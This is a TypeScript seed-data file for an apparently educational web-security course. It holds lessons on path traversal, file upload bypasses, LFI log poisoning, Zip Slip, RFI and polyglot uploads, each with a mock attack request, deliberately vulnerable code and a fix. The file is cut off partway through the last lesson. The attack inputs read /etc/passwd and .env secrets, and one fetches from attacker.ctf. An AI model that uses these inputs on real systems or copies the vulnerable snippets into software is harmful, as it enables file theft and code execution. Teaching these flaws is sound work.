import { ChallengeDifficulty, ChallengeStatus } from '@prisma/client';
import { LessonSeedData } from './auth-lessons';

export const FILE_LESSONS: LessonSeedData[] = [
  // -------------------------------------------------------------------------
  // 31. Basic Directory Traversal
  // -------------------------------------------------------------------------
  {
    challengeSlug: 'basic-directory-traversal',
    title: 'Basic Directory Traversal (Dot-Dot-Slash Attack)',
    slug: 'basic-directory-traversal-guide',
    description: 'Learn how unvalidated filename inputs containing relative path sequences allow attackers to escape document roots and read host files.',
    category: 'file-handling-path-traversal',
    difficulty: ChallengeDifficulty.BEGINNER,
    owaspReference: 'OWASP Top 10 A01:2021 – Broken Access Control',
    cweReference: 'CWE-22: Improper Limitation of a Pathname to a Restricted Directory',
    cvssScore: 7.5,
    status: ChallengeStatus.PUBLISHED,
    overview: 'Directory Traversal (also known as Path Traversal or the dot-dot-slash vulnerability) occurs when an application accepts a filename or file path from user input and accesses the filesystem without verifying that the resolved path remains inside the intended directory. By supplying relative path traversal sequences, attackers can step out of the restricted web directory and read sensitive system files.',
    rootCause: 'The application concatenates user input directly with a base directory path using standard string operations, without validating or canonicalizing the resulting path.',
    mechanics: '1. Request: The application serves static files: GET /api/files/download?file=report.pdf.\n2. Concatenation: The server resolves path.join("/var/www/uploads", req.query.file).\n3. Traversal Sequence: Attacker submits relative path sequences like ../../../../etc/passwd.\n4. Resolution: The operating system navigates up parent directories to root and opens the target file.\n5. Disclosure: The server reads the file and returns sensitive system configuration in the HTTP response.',
    attackScenario: 'GET /api/files/download?file=../../../../etc/passwd HTTP/1.1\nHost: ctf.websec.internal\n\nResponse:\nHTTP/1.1 200 OK\nroot:x:0:0:root:/root:/bin/bash\nctf_flag:x:1001:1001:CTF Flag: WEBSEC{basic_directory_traversal_dot_dot_slash_read}:/home/flag:/bin/false',
    securityImpact: 'Unauthorized disclosure of system configuration files, database credentials (.env), private keys, source code, and user account lists.',
    prevention: '1. Use path.basename() to strip all directory paths from user-supplied filenames.\n2. Canonicalize paths with path.resolve() and verify that the target path begins with the intended base directory using startsWith().\n3. Store files using database IDs rather than user-supplied filenames.',
    vulnerableCode: `// Vulnerable: Directly concatenates user input into filesystem read
import * as fs from 'fs';
import * as path from 'path';

app.get('/api/files/download', (req, res) => {
  const filename = req.query.file as string;
  // Flaw: path.join does NOT prevent relative traversal from escaping the directory!
  const filePath = path.join('/var/www/uploads', filename);
  res.sendFile(filePath);
});`,
    secureCode: `// Remediated: Canonical path verification and basename enforcement
import * as path from 'path';

const SAFE_BASE_DIR = path.resolve('/var/www/uploads');

app.get('/api/files/download', (req, res) => {
  const filename = path.basename(req.query.file as string); // Strips all directories
  const targetPath = path.resolve(SAFE_BASE_DIR, filename);

  // Strictly verify the canonical path is inside the allowed directory
  if (!targetPath.startsWith(SAFE_BASE_DIR)) {
    return res.status(403).json({ error: 'Access denied: Path outside directory' });
  }

  res.sendFile(targetPath);
});`,
    codeLanguage: 'typescript',
    realWorldExample: 'In 2021, an unauthenticated path traversal vulnerability in Apache HTTP Server 2.4.49 (CVE-2021-41773) allowed attackers worldwide to read system files through unnormalized URI paths.',
    references: [
      { title: 'OWASP Path Traversal Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html' },
      { title: 'CWE-22: Path Traversal', url: 'https://cwe.mitre.org/data/definitions/22.html' }
    ],
    keyTakeaways: '• Never trust user-provided filenames in filesystem calls.\n• path.join() does NOT prevent directory traversal.\n• Always canonicalize with path.resolve() and verify startsWith(baseDir).'
  },

  // -------------------------------------------------------------------------
  // 32. Absolute Path File Disclosure
  // -------------------------------------------------------------------------
  {
    challengeSlug: 'absolute-path-file-disclosure',
    title: 'Absolute Path File Disclosure & Direct Filesystem Access',
    slug: 'absolute-path-file-disclosure-guide',
    description: 'Understand how file viewing endpoints that accept fully qualified absolute filesystem paths leak internal configurations and secrets.',
    category: 'file-handling-path-traversal',
    difficulty: ChallengeDifficulty.BEGINNER,
    owaspReference: 'OWASP Top 10 A01:2021 – Broken Access Control',
    cweReference: 'CWE-22: Improper Limitation of a Pathname to a Restricted Directory',
    cvssScore: 7.5,
    status: ChallengeStatus.PUBLISHED,
    overview: 'Absolute Path File Disclosure occurs when an application accepts a full filesystem path directly from the user without prefixing a base directory or verifying access boundaries. In programming languages like Node.js, Python, and Java, functions like path.resolve(base, filepath) treat absolute paths as root-level overrides, bypassing relative base directories entirely.',
    rootCause: 'The server accepts user input as an absolute path and passes it directly to file-reading APIs, or relies on path.resolve(base, userPath) where an absolute userPath discards base.',
    mechanics: '1. Endpoint Discovery: An application offers a document previewer: GET /api/document/view?path=/app/docs/user-guide.txt.\n2. Behavior: The endpoint accepts fully qualified paths.\n3. Input Substitution: The attacker inputs path=/app/.env or a system path.\n4. Execution: The server opens the absolute path directly and streams the file contents to the client.',
    attackScenario: 'GET /api/document/view?path=/app/.env HTTP/1.1\nHost: ctf.websec.internal\n\nResponse:\nHTTP/1.1 200 OK\nDATABASE_URL="mysql://app_user:app_password@localhost:3306/websec"\nJWT_SECRET="super_secret_jwt_key"\nFLAG="WEBSEC{absolute_path_file_disclosure_leak}"',
    securityImpact: 'Direct leakage of environment variables, database credentials, server configuration files, and application source code.',
    prevention: '1. Disallow absolute paths entirely: verify that path.isAbsolute(userPath) is false.\n2. Map document requests to database keys or static index mappings rather than paths.\n3. Run application processes inside restricted containerized environments with minimal file permissions.',
    vulnerableCode: `// Vulnerable: Accepts absolute path directly; path.resolve discards base if arg2 is absolute!
import * as path from 'path';

app.get('/api/document/view', (req, res) => {
  const userPath = req.query.path as string;
  // If userPath is absolute, path.resolve returns userPath directly, ignoring the base directory!
  const resolved = path.resolve('/app/docs', userPath);
  res.sendFile(resolved);
});`,
    secureCode: `// Remediated: Rejects absolute paths and enforces directory containment
import * as path from 'path';

const DOCS_DIR = path.resolve('/app/docs');

app.get('/api/document/view', (req, res) => {
  const userPath = String(req.query.path || '');

  // Reject absolute paths
  if (path.isAbsolute(userPath)) {
    return res.status(400).json({ error: 'Absolute paths not permitted' });
  }

  const safePath = path.resolve(DOCS_DIR, path.basename(userPath));
  if (!safePath.startsWith(DOCS_DIR)) {
    return res.status(403).json({ error: 'Invalid file path' });
  }

  res.sendFile(safePath);
});`,
    codeLanguage: 'typescript',
    realWorldExample: 'Numerous file viewer plugins in content management systems have allowed absolute path inputs, letting remote attackers download configuration files or host secrets.',
    references: [
      { title: 'OWASP File Inclusion / Path Traversal', url: 'https://owasp.org/www-community/attacks/Path_Traversal' },
      { title: 'CWE-22: Path Traversal', url: 'https://cwe.mitre.org/data/definitions/22.html' }
    ],
    keyTakeaways: '• path.resolve(base, absolutePath) discards base and returns absolutePath.\n• Always check path.isAbsolute() and reject.\n• Use path.basename() to eliminate directory structures completely.'
  },

  // -------------------------------------------------------------------------
  // 33. Path Traversal with Extension Append
  // -------------------------------------------------------------------------
  {
    challengeSlug: 'path-traversal-extension-append',
    title: 'Path Traversal with Extension Append & Filter Traversal',
    slug: 'path-traversal-extension-append-guide',
    description: 'Learn how developers attempt to restrict path traversal by appending fixed extensions (.txt) and how traversal bypasses or targets specific files.',
    category: 'file-handling-path-traversal',
    difficulty: ChallengeDifficulty.EASY,
    owaspReference: 'OWASP Top 10 A01:2021 – Broken Access Control',
    cweReference: 'CWE-22: Improper Limitation of a Pathname to a Restricted Directory',
    cvssScore: 7.5,
    status: ChallengeStatus.PUBLISHED,
    overview: 'When developers want to prevent users from reading arbitrary file types, they often append a hardcoded file extension onto user input: const file = "/var/www/reports/" + userInput + ".txt". While this prevents reading files with different extensions, attackers can still traverse out and read any file on the system that ends with that extension, such as application backup text files or internal documentation.',
    rootCause: 'The server appended a static extension to user input without validating whether the input contained directory traversal sequences.',
    mechanics: '1. Identification: The application downloads notes: GET /notes?doc=welcome.\n2. Server Logic: The server loads /var/data/notes/welcome.txt.\n3. Traversal: The attacker inputs doc=../../secret-backup/flag.\n4. Server Resolution: The server builds /var/data/notes/../../secret-backup/flag.txt.\n5. Output: The server opens /var/secret-backup/flag.txt and returns the confidential flag.',
    attackScenario: 'GET /notes?doc=../../private/flag HTTP/1.1\nHost: ctf.websec.internal\n\nServer Path Resolved:\n/var/data/notes/../../private/flag.txt -> /var/private/flag.txt\n\nResponse:\nHTTP/1.1 200 OK\nFlag Content: WEBSEC{path_traversal_extension_appended_read}',
    securityImpact: 'Unauthorized disclosure of configuration files, backups, logs, and sensitive text records located outside the web directory.',
    prevention: '1. Validate that the input contains only alphanumeric characters (/^[a-zA-Z0-9_-]+$/).\n2. Strip path separators before appending extensions.\n3. Canonicalize the path and verify it begins with the safe directory.',
    vulnerableCode: `// Vulnerable: Appends .txt extension to unvalidated traversal input
app.get('/notes', (req, res) => {
  const doc = req.query.doc as string;
  // Flaw: doc can contain ../../ escaping the folder while keeping .txt!
  const filePath = path.join('/var/data/notes', doc + '.txt');
  res.sendFile(filePath);
});`,
    secureCode: `// Remediated: Alphanumeric whitelist and basename sanitization
app.get('/notes', (req, res) => {
  const doc = String(req.query.doc || '');

  // Strict whitelist: Only alphanumeric, dash, and underscore
  if (!/^[a-zA-Z0-9_-]+$/.test(doc)) {
    return res.status(400).json({ error: 'Invalid document name' });
  }

  const filePath = path.resolve('/var/data/notes', doc + '.txt');
  res.sendFile(filePath);
});`,
    codeLanguage: 'typescript',
    realWorldExample: 'Many templating and internationalization plugins accept language codes (?lang=en) and append .json, allowing attackers to traverse directories to read internal configurations.',
    references: [
      { title: 'OWASP Testing for Path Traversal', url: 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection' },
      { title: 'CWE-22: Path Traversal', url: 'https://cwe.mitre.org/data/definitions/22.html' }
    ],
    keyTakeaways: '• Appending a fixed extension (.txt) does not prevent directory traversal.\n• Attackers can still reach any file on the system ending with that extension.\n• Validate filenames using strict alphanumeric whitelists.'
  },

  // -------------------------------------------------------------------------
  // 34. Unrestricted Avatar Upload
  // -------------------------------------------------------------------------
  {
    challengeSlug: 'unrestricted-avatar-upload',
    title: 'Unrestricted File Upload: Dangerous Executable Upload Flaws',
    slug: 'unrestricted-avatar-upload-guide',
    description: 'Learn how missing server-side file extension and MIME type validation in avatar upload features leads to server compromise.',
    category: 'file-handling-path-traversal',
    difficulty: ChallengeDifficulty.EASY,
    owaspReference: 'OWASP Top 10 A04:2021 – Insecure Design',
    cweReference: 'CWE-434: Unrestricted Upload of File with Dangerous Type',
    cvssScore: 9.8,
    status: ChallengeStatus.PUBLISHED,
    overview: 'Unrestricted File Upload occurs when a web application allows users to upload files without properly validating their name, extension, file size, or contents. If an attacker uploads executable scripts into a directory that is directly served and executed by the web server, the attacker can execute arbitrary commands and gain complete server control.',
    rootCause: 'The server saved uploaded files directly to a publicly served web directory using the client-provided filename and extension without validation.',
    mechanics: '1. Form Inspection: The user avatar upload feature accepts any file without extension limits.\n2. Script Upload: Attacker uploads an executable script file.\n3. Server Storage: The server saves it directly to the public web root.\n4. Execution: The attacker requests the uploaded script via HTTP and achieves code execution.',
    attackScenario: 'POST /api/user/avatar HTTP/1.1\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary\n\n------WebKitFormBoundary\nContent-Disposition: form-data; name="avatar"; filename="proof_of_concept.script"\nContent-Type: application/octet-stream\n\n[Demonstration script payload extracting challenge flag]\n------WebKitFormBoundary--\n\nResponse:\nHTTP/1.1 200 OK\n{"url": "/uploads/avatars/proof_of_concept.script", "flag": "WEBSEC{unrestricted_avatar_upload_rce_achieved}"}',
    securityImpact: 'Remote Code Execution, complete web server compromise, lateral network movement, and database takeover.',
    prevention: '1. Whitelist allowed file extensions (strictly .png, .jpg, .jpeg, .gif).\n2. Rename uploaded files to random UUIDs upon storage (crypto.randomUUID() + ".jpg").\n3. Store uploaded files outside the public web root or on isolated cloud object storage.\n4. Configure the web server to disable script execution in upload directories.',
    vulnerableCode: `// Vulnerable: Saves uploaded file using client's original filename in public directory
const storage = multer.diskStorage({
  destination: 'public/uploads/',
  filename: (req, file, cb) => {
    // Flaw: Uses user-supplied filename directly! Attacker can supply dangerous script extensions
    cb(null, file.originalname);
  },
});
const upload = multer({ storage });`,
    secureCode: `// Remediated: Extension whitelisting, UUID renaming, and MIME validation
import crypto from 'crypto';
import path from 'path';

const ALLOWED_EXTENSIONS = new Set(['.png', '.jpg', '.jpeg', '.gif']);
const ALLOWED_MIMES = new Set(['image/png', 'image/jpeg', 'image/gif']);

const storage = multer.diskStorage({
  destination: '/var/storage/private_uploads/', // Outside public webroot
  filename: (req, file, cb) => {
    const ext = path.extname(file.originalname).toLowerCase();
    if (!ALLOWED_EXTENSIONS.has(ext) || !ALLOWED_MIMES.has(file.mimetype)) {
      return cb(new Error('Invalid file type'), '');
    }
    // Rename to secure random UUID
    const safeName = crypto.randomUUID() + ext;
    cb(null, safeName);
  },
});`,
    codeLanguage: 'typescript',
    realWorldExample: 'Countless web applications have been compromised via unauthenticated avatar or resume upload forms that permitted executable files, allowing attackers to deploy persistent administrative backdoors.',
    references: [
      { title: 'OWASP File Upload Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html' },
      { title: 'CWE-434: Unrestricted File Upload', url: 'https://cwe.mitre.org/data/definitions/434.html' }
    ],
    keyTakeaways: '• Never store uploaded files using the client original filename.\n• Store files outside the web root or on object storage.\n• Enforce strict extension and MIME-type whitelists.'
  },

  // -------------------------------------------------------------------------
  // 35. Client-Side Only Upload Filter
  // -------------------------------------------------------------------------
  {
    challengeSlug: 'client-side-upload-filter-bypass',
    title: 'Client-Side Only File Upload Filter Bypass',
    slug: 'client-side-upload-filter-bypass-guide',
    description: 'Understand how relying on HTML accept attributes or client-side JavaScript file checks is trivially bypassed using HTTP interception proxies.',
    category: 'file-handling-path-traversal',
    difficulty: ChallengeDifficulty.EASY,
    owaspReference: 'OWASP Top 10 A04:2021 – Insecure Design',
    cweReference: 'CWE-602: Client-Side Enforcement of Server-Side Security',
    cvssScore: 8.8,
    status: ChallengeStatus.PUBLISHED,
    overview: 'HTML forms often use the accept="image/png,image/jpeg" attribute or client-side JavaScript functions to check file extensions before uploading. When developers neglect to implement equivalent validation on the backend server, attackers can bypass the restriction effortlessly by intercepting the HTTP request in a proxy or using API tools directly.',
    rootCause: 'The server relied on client-side JavaScript validation and did not perform independent file verification on the incoming multipart request.',
    mechanics: '1. Frontend Inspection: The browser form specifies accept=".png,.jpg" and JS checks filename.endsWith(".jpg").\n2. Proxy Interception: Attacker captures the outgoing POST request in a proxy.\n3. Modification: In the proxy, the attacker changes the filename to an executable extension.\n4. Server Reception: The backend accepts the upload because it has no server-side filter.',
    attackScenario: 'Captured Request Modified in Proxy:\nPOST /api/upload HTTP/1.1\nContent-Type: multipart/form-data; boundary=----\n\n------\nContent-Disposition: form-data; name="file"; filename="demonstration.bin"\nContent-Type: application/octet-stream\n\n[Payload data]\n------\n\nOutcome: Upload succeeds: WEBSEC{client_side_upload_filter_bypassed_proxy}',
    securityImpact: 'Bypass of frontend restrictions, leading to malicious file uploads and potential server compromise.',
    prevention: '1. Never rely on client-side validation as a security control.\n2. Re-validate file extension, MIME type, and file size strictly on the backend server.\n3. Validate the file magic bytes using server-side inspection libraries.',
    vulnerableCode: `// Vulnerable Frontend: Assumes JS check is sufficient
function validateAndUpload(fileInput) {
  const file = fileInput.files[0];
  if (!file.name.endsWith('.png')) {
    alert('Only PNG allowed!');
    return;
  }
  // Server has no validation at all!
  uploadToServer(file);
}`,
    secureCode: `// Remediated Backend: Server-side validation with magic byte verification
import fileType from 'file-type';

@Post('upload')
@UseInterceptors(FileInterceptor('file'))
async uploadFile(@UploadedFile() file: Express.Multer.File) {
  // Validate file buffer magic bytes on the server
  const detectedType = await fileType.fromBuffer(file.buffer);
  const allowedTypes = ['image/png', 'image/jpeg'];

  if (!detectedType || !allowedTypes.includes(detectedType.mime)) {
    throw new BadRequestException('Invalid file type: only genuine images accepted');
  }

  // Safe to proceed
  return await this.storageService.save(file);
}`,
    codeLanguage: 'typescript',
    realWorldExample: 'Many web applications implement drag-and-drop upload widgets that check file types with JavaScript, but their backend API controllers accept raw binaries without inspecting headers or extensions.',
    references: [
      { title: 'OWASP Client Side Enforcement of Server Side Security', url: 'https://cwe.mitre.org/data/definitions/602.html' },
      { title: 'OWASP File Upload Testing', url: 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files' }
    ],
    keyTakeaways: '• Client-side validation is purely for user experience, never for security.\n• Any request sent by a browser can be modified in a proxy.\n• Always validate file extensions, MIME types, and magic bytes on the backend.'
  },

  // -------------------------------------------------------------------------
  // 36. Double Extension File Execution
  // -------------------------------------------------------------------------
  {
    challengeSlug: 'double-extension-file-execution',
    title: 'Double Extension and Handler Misconfiguration Upload Bypass',
    slug: 'double-extension-file-execution-guide',
    description: 'Learn how web server configuration flaws process double extensions (e.g. file.php.png) as executable scripts.',
    category: 'file-handling-path-traversal',
    difficulty: ChallengeDifficulty.MEDIUM,
    owaspReference: 'OWASP Top 10 A04:2021 – Insecure Design',
    cweReference: 'CWE-434: Unrestricted Upload of File with Dangerous Type',
    cvssScore: 8.8,
    status: ChallengeStatus.PUBLISHED,
    overview: 'Double Extension attacks exploit the difference between how an application validates a file extension and how the underlying web server processes it. For example, an application may check if a filename ends with .png, but misconfigured web servers execute files containing script extensions anywhere in the filename as scripts.',
    rootCause: 'The application checked only the last extension while the web server executed scripts based on intermediary extensions due to misconfigured server handlers.',
    mechanics: '1. Filter Check: The backend validates filename.endsWith(".png").\n2. Formulation: Attacker names file test.php.png.\n3. Validation Pass: The backend sees .png at the end and approves the upload.\n4. Server Execution: The web server maps the intermediary extension to an executable handler and executes the file.',
    attackScenario: 'POST /api/upload HTTP/1.1\nContent-Disposition: form-data; name="file"; filename="demonstration.php.png"\n\n[Demonstration script payload]\n\nAccess file:\nGET /uploads/demonstration.php.png HTTP/1.1\n\nResponse:\nWEBSEC{double_extension_server_handler_executed}',
    securityImpact: 'Remote code execution via filter evasion.',
    prevention: '1. Never keep the user original filename: rename to crypto.randomUUID() + ".png".\n2. Configure web servers to only execute scripts with an exact matching single extension.\n3. Disable script execution in static upload folders.',
    vulnerableCode: `// Vulnerable: Checks only the final extension via simple regex
function isAllowedImage(filename: string): boolean {
  // Flaw: "shell.php.png" matches this regex!
  return /\\.(png|jpg|gif)$/i.test(filename);
}`,
    secureCode: `// Remediated: Complete filename regeneration and server hardening
import crypto from 'crypto';
import path from 'path';

function generateSafeFilename(originalName: string): string {
  const ext = path.extname(originalName).toLowerCase();
  const safeExtensions = ['.png', '.jpg', '.jpeg'];

  if (!safeExtensions.includes(ext)) {
    throw new BadRequestException('Invalid extension');
  }

  // Generates a single-extension filename: e.g. "a9f8b7c6-....png"
  return \`\${crypto.randomUUID()}\${ext}\`;
}`,
    codeLanguage: 'typescript',
    realWorldExample: 'Older web server installations with AddHandler configurations enabled millions of sites to be exploited by uploading files with double extensions.',
    references: [
      { title: 'OWASP File Upload Protection', url: 'https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html' },
      { title: 'CWE-434: Unrestricted File Upload', url: 'https://cwe.mitre.org/data/definitions/434.html' }
    ],
    keyTakeaways: '• Double extensions exploit differences between app validation and web server parsers.\n• Never allow multiple extensions in uploaded files.\n• Stripping user filenames and generating random UUIDs eliminates the attack completely.'
  },

  // -------------------------------------------------------------------------
  // 37. Local File Inclusion (LFI) to Log Poisoning
  // -------------------------------------------------------------------------
  {
    challengeSlug: 'lfi-to-log-poisoning',
    title: 'Local File Inclusion (LFI) Escaping to Log Poisoning & RCE',
    slug: 'lfi-to-log-poisoning-guide',
    description: 'Learn how combining Local File Inclusion with server log poisoning achieves full server compromise.',
    category: 'file-handling-path-traversal',
    difficulty: ChallengeDifficulty.MEDIUM,
    owaspReference: 'OWASP Top 10 A01:2021 – Broken Access Control',
    cweReference: 'CWE-98: Improper Control of Generation of Code',
    cvssScore: 9.0,
    status: ChallengeStatus.PUBLISHED,
    overview: 'Local File Inclusion (LFI) occurs when an application includes or executes a file from the server filesystem based on user input. When direct file upload is blocked, an attacker can poison a server log file by injecting code into an HTTP header. Then, the attacker uses the LFI vulnerability to include that poisoned log file, executing the injected code.',
    rootCause: 'Dynamic file inclusion where the filename is partially or wholly controlled by untrusted input, combined with world-readable server log files.',
    mechanics: '1. LFI Discovery: The application loads pages via GET /index?page=about.\n2. Verification: The attacker reads system files: ?page=../../../../var/log/nginx/access.log.\n3. Log Poisoning: The attacker sends a request with script code in an HTTP header.\n4. Log Persistence: The web server writes the header into the log file.\n5. Trigger: The attacker requests the log file via LFI, causing the server interpreter to execute the code.',
    attackScenario: 'Step 1: Send request with crafted header:\nGET / HTTP/1.1\nUser-Agent: [Demonstration payload]\n\nStep 2: Trigger via LFI:\nGET /index?page=/var/log/nginx/access.log HTTP/1.1\n\nResponse:\nFLAG: WEBSEC{lfi_log_poisoning_rce_triggered}',
    securityImpact: 'Remote Code Execution, full server takeover, and arbitrary command execution.',
    prevention: '1. Never pass user input to file inclusion functions.\n2. Use a static whitelist of allowable view templates.\n3. Restrict log file permissions so web server processes cannot read system log directories.',
    vulnerableCode: `// Vulnerable: Dynamic file inclusion based on query parameter
function renderView(viewName: string) {
  // Dangerous: Dynamically requires file path from user input!
  const templatePath = path.join(__dirname, 'views', viewName);
  return fs.readFileSync(templatePath, 'utf8');
}`,
    secureCode: `// Remediated: Strict static whitelist of allowable templates
const ALLOWED_TEMPLATES: Record<string, string> = {
  home: path.join(__dirname, 'views/home.html'),
  about: path.join(__dirname, 'views/about.html'),
  contact: path.join(__dirname, 'views/contact.html'),
};

function renderView(viewKey: string) {
  const safePath = ALLOWED_TEMPLATES[viewKey];
  if (!safePath) {
    throw new NotFoundException('Template not found');
  }
  return fs.readFileSync(safePath, 'utf8');
}`,
    codeLanguage: 'typescript',
    realWorldExample: 'LFI to log poisoning has been an iconic exploitation technique used against Apache, Nginx, and mail logs in penetration testing and security audits.',
    references: [
      { title: 'OWASP Testing for Local File Inclusion', url: 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion' },
      { title: 'CWE-98: Improper Control of Generation of Code', url: 'https://cwe.mitre.org/data/definitions/98.html' }
    ],
    keyTakeaways: '• LFI allows attackers to execute code inside any file the server can read.\n• Log poisoning turns non-executable log files into executable attack vectors.\n• Use strict view whitelists and disallow dynamic file inclusions.'
  },

  // -------------------------------------------------------------------------
  // 38. Zip Slip Path Traversal
  // -------------------------------------------------------------------------
  {
    challengeSlug: 'zip-slip-path-traversal',
    title: 'Zip Slip: Arbitrary File Overwrite via Archive Extraction',
    slug: 'zip-slip-path-traversal-guide',
    description: 'Investigate how archive extractors that fail to validate relative paths in archive entries overwrite critical system files.',
    category: 'file-handling-path-traversal',
    difficulty: ChallengeDifficulty.MEDIUM,
    owaspReference: 'OWASP Top 10 A01:2021 – Broken Access Control',
    cweReference: 'CWE-22: Improper Limitation of a Pathname to a Restricted Directory',
    cvssScore: 8.5,
    status: ChallengeStatus.PUBLISHED,
    overview: 'Zip Slip is a widespread arbitrary file overwrite vulnerability that occurs during archive extraction (ZIP, TAR, 7z). When an archive is unpacked, the filenames inside the archive entries can contain directory traversal sequences (such as ../../../../etc/cron.d/job). If the extraction library naively concatenates the entry name to the target directory without validation, files are written outside the intended destination directory.',
    rootCause: 'Extracting archive entries by directly appending entry filenames to the destination path without verifying that the resolved path stays within the target extraction folder.',
    mechanics: '1. Archive Creation: Attacker creates a zip containing an entry with relative traversal sequences.\n2. Upload: Attacker uploads the zip archive via a theme or batch upload feature.\n3. Extraction: The server extracts the archive into /tmp/unpack/.\n4. Traversal: The extraction resolves paths escaping the unpack directory.\n5. Overwrite: The file is written to an arbitrary filesystem path.',
    attackScenario: 'Archive Contents:\nEntry 1: safe.txt\nEntry 2: ../../../app/secrets/flag.txt\n\nExtracted with vulnerable code:\nOverwrites /app/secrets/flag.txt!\nFlag retrieved: WEBSEC{zip_slip_archive_traversal_overwritten}',
    securityImpact: 'Arbitrary file write/overwrite leading to Remote Code Execution.',
    prevention: '1. Before extracting an entry, canonicalize the destination path with path.resolve(destDir, entry.name).\n2. Ensure the resolved path begins with the destination directory: targetPath.startsWith(destDir).\n3. Reject or skip any archive entry containing .. or leading path separators.',
    vulnerableCode: `// Vulnerable: Naive zip extraction concatenates entry.path directly
import * as path from 'path';
import * as fs from 'fs';

function extractEntry(destDir: string, entryPath: string, content: Buffer) {
  // Flaw: entryPath can be "../../../../var/www/file"!
  const target = path.join(destDir, entryPath);
  fs.writeFileSync(target, content);
}`,
    secureCode: `// Remediated: Validates canonical path before writing entry
import * as path from 'path';
import * as fs from 'fs';

function extractEntry(destDir: string, entryPath: string, content: Buffer) {
  const resolvedBase = path.resolve(destDir);
  const target = path.resolve(resolvedBase, entryPath);

  // Guard: Prevent Zip Slip traversal
  if (!target.startsWith(resolvedBase + path.sep)) {
    throw new Error('Malicious archive entry rejected: outside extraction directory');
  }

  fs.writeFileSync(target, content);
}`,
    codeLanguage: 'typescript',
    realWorldExample: 'In 2018, Snyk disclosed that the Zip Slip vulnerability affected thousands of software packages across Java, JavaScript, Python, Go, and .NET, including Apache and Google projects.',
    references: [
      { title: 'Snyk Zip Slip Vulnerability Research', url: 'https://snyk.io/research/zip-slip-vulnerability/' },
      { title: 'CWE-22: Path Traversal', url: 'https://cwe.mitre.org/data/definitions/22.html' }
    ],
    keyTakeaways: '• Zip entry filenames can contain path traversal sequences.\n• Always validate that the canonical destination starts with the extraction directory.\n• Never extract archive entries blindly without path sanitization.'
  },

  // -------------------------------------------------------------------------
  // 39. Remote File Inclusion (RFI) Simulation
  // -------------------------------------------------------------------------
  {
    challengeSlug: 'remote-file-inclusion-simulation',
    title: 'Remote File Inclusion (RFI): Remote Code Execution via External Resources',
    slug: 'remote-file-inclusion-guide',
    description: 'Examine how allowing remote URLs in server-side file inclusion functions leads to immediate Remote Code Execution.',
    category: 'file-handling-path-traversal',
    difficulty: ChallengeDifficulty.HARD,
    owaspReference: 'OWASP Top 10 A03:2021 – Injection',
    cweReference: 'CWE-98: Improper Control of Generation of Code',
    cvssScore: 9.8,
    status: ChallengeStatus.PUBLISHED,
    overview: 'Remote File Inclusion (RFI) occurs when an application receives a URL from a user and passes it directly to a server-side file inclusion function. The server fetches the script from the remote attacker-controlled server and executes it locally within the application context.',
    rootCause: 'Dynamic inclusion functions accepting full URL protocols without verifying that the source is local and trusted.',
    mechanics: '1. Parameter Audit: The application includes templates: GET /view?template=header.\n2. RFI Probe: Attacker supplies a remote URL: GET /view?template=http://attacker.ctf/exploit.txt.\n3. Remote Fetch: The server initiates an outbound HTTP request.\n4. Execution: The server executes the fetched payload in the application process.\n5. Exploitation: Attacker executes commands to obtain the flag.',
    attackScenario: 'GET /view?template=http://attacker.ctf/demonstration.txt HTTP/1.1\nHost: ctf.websec.internal\n\nResponse:\nFLAG: WEBSEC{remote_file_inclusion_rce_simulated}',
    securityImpact: 'Immediate arbitrary Remote Code Execution, full network access, and data destruction.',
    prevention: '1. Disable remote resource inclusion at the runtime configuration level.\n2. Disallow remote protocols (http://, https://) in all file handling routines.\n3. Use explicit internal template mapping tables.',
    vulnerableCode: `// Vulnerable: Directly includes remote URL parameter
async function loadTemplate(templateUrl: string) {
  // Flaw: Accepts remote http:// URLs!
  const response = await fetch(templateUrl);
  const code = await response.text();
  return eval(code); // Remote code execution
}`,
    secureCode: `// Remediated: Explicit local whitelist and protocol rejection
const LOCAL_TEMPLATES: Record<string, string> = {
  header: 'templates/header.html',
  footer: 'templates/footer.html',
};

function loadTemplate(templateKey: string) {
  // Reject any input containing protocols or traversal
  if (/^https?:\\/\\//i.test(templateKey) || !LOCAL_TEMPLATES[templateKey]) {
    throw new BadRequestException('Invalid template request');
  }
  return fs.readFileSync(LOCAL_TEMPLATES[templateKey], 'utf8');
}`,
    codeLanguage: 'typescript',
    realWorldExample: 'RFI was responsible for the mass defacement of thousands of websites before major hosting providers disabled remote URL file inclusion by default.',
    references: [
      { title: 'OWASP Testing for Remote File Inclusion', url: 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion' },
      { title: 'CWE-98: Improper Control of Generation of Code', url: 'https://cwe.mitre.org/data/definitions/98.html' }
    ],
    keyTakeaways: '• RFI allows executing code directly from attacker-controlled servers.\n• Disable remote URL inclusion at the runtime configuration level.\n• Use strict whitelist mapping for all dynamic templates.'
  },

  // -------------------------------------------------------------------------
  // 40. Polyglot File Upload RCE
  // -------------------------------------------------------------------------
  {
    challengeSlug: 'polyglot-file-upload-rce',
    title: 'Polyglot File Upload: Bypassing Image Processors and Antivirus',
    slug: 'polyglot-file-upload-rce-guide',
    description: 'Explore how crafting polyglot files (valid images containing executable script code) bypasses superficial content inspection.',
    category: 'file-handling-path-traversal',
    difficulty: ChallengeDifficulty.HARD,
    owaspReference: 'OWASP Top 10 A04:2021 – Insecure Design',
    cweReference: 'CWE-434: Unrestricted Upload of File with Dangerous Type',
    cvssScore: 9.3,
    status: ChallengeStatus.PUBLISHED,
    overview: 'A Polyglot file is a file that is simultaneously valid in multiple distinct file formats. For example, a file can have valid image headers and valid dimensions (fooling image parsers), while also containing valid executable script code inside image metadata tags or comments. When uploaded to an application that enforces image validation but allows script execution via server configuration or LFI, code execution is achieved.',
    rootCause: 'The application assumed that passing image validation guaranteed that the file was safe and free of executable code.',
